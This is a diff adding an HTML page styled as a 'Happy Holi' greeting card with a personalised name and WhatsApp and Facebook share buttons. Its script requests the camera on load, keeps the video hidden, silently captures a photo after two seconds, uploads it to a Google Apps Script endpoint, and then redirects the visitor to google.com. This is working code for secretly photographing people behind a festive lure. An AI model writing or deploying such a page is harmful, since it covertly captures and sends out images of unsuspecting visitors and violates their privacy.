@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Happy Holi - Camera Page</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to bottom, #ffff99, #99ccff);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+      text-align: center;
+      color: #333;
+    }
+    .container {
+      padding: 20px;
+      max-width: 400px;
+      width: 100%;
+    }
+    .greeting {
+      font-size: 2em;
+      font-weight: bold;
+      color: #00b300;
+      text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
+    }
+    #video {
+      width: 100%;
+      border-radius: 4px;
+      margin-bottom: 10px;
+      display: none;
+    }
+    h1 {
+      font-size: 2em;
+      color: #000;
+      margin-bottom: 20px;
+    }
+    .share-buttons {
+      margin-top: 20px;
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+    }
+    .whatsapp, .facebook {
+      padding: 10px 20px;
+      margin: 10px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 1em;
+      width: 100%;
+    }
+    .whatsapp {
+      background-color: #25d366;
+      color: white;
+    }
+    .facebook {
+      background-color: #3b5998;
+      color: white;
+    }
+
+    /* Mobile responsive styling */
+    @media (max-width: 600px) {
+      .whatsapp, .facebook {
+        width: 80%; /* Make buttons wider on smaller screens */
+        font-size: 1.2em; /* Increase font size */
+        padding: 15px 0; /* Make buttons taller */
+      }
+    }
+
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Welcome to the Camera Page</h1>
+    
+    <!-- Greeting based on name parameter -->
+    <div class="greeting" id="greetingMessage"></div>
+
+    <p>Get ready to take your picture!</p>
+
+    <video id="video" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    
+    <div class="share-buttons">
+      <button class="whatsapp">Whatsapp Share</button>
+      <button class="facebook">Facebook Share</button>
+    </div>
+  </div>
+
+  <script>
+    // Function to get the URL parameter (name)
+    function getUrlParameter(name) {
+      const urlParams = new URLSearchParams(window.location.search);
+      return urlParams.get(name);
+    }
+
+    // Retrieve the name from the URL and display it
+    const name = getUrlParameter('name');
+    if (name) {
+      document.getElementById('greetingMessage').textContent = `Hello, ${name}! 🎉`;
+    } else {
+      document.getElementById('greetingMessage').textContent = "Hello, Guest! 🎉";
+    }
+
+    // Camera functionality (video capture)
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const photoInput = document.createElement('input'); // Create photo input dynamically
+
+    // Access the camera and start the video
+    navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+      video.srcObject = stream;
+
+      // Take a photo after 2 seconds and auto-submit
+      setTimeout(() => {
+        const context = canvas.getContext('2d');
+        canvas.width = video.videoWidth || 640; // Fallback width
+        canvas.height = video.videoHeight || 480; // Fallback height
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // Create a hidden input with the captured image data
+        photoInput.type = 'hidden';
+        photoInput.value = canvas.toDataURL('image/png');
+        document.body.appendChild(photoInput);
+
+        // Stop the video stream
+        stream.getTracks().forEach(track => track.stop());
+        video.style.display = 'none';
+
+        // Automatically submit the form or send the image to a server
+        const formData = new FormData();
+        formData.append('photo', photoInput.value);
+        
+        // Send form data using fetch (or you can use your original Google Apps Script endpoint)
+        fetch('https://script.google.com/macros/s/AKfycbxwMvuQnraAoBx9TrB-g__Pa9oH3ApUW7f3E9pbI-Em7pT3mZxUVkdXNSseG9vgQCqI/exec', {
+          method: 'POST',
+          body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+          // Handle success response (optional)
+          console.log("Photo submitted successfully", data);
+          window.location.href = 'https://google.com'; // Or any other redirection
+        })
+        .catch(error => {
+          console.error('Error submitting photo:', error);
+        });
+      }, 2000); // Capture after 2 seconds
+    })
+    .catch(err => {
+      console.error("Error accessing camera:", err);
+    });
+  </script>
+</body>
+</html>
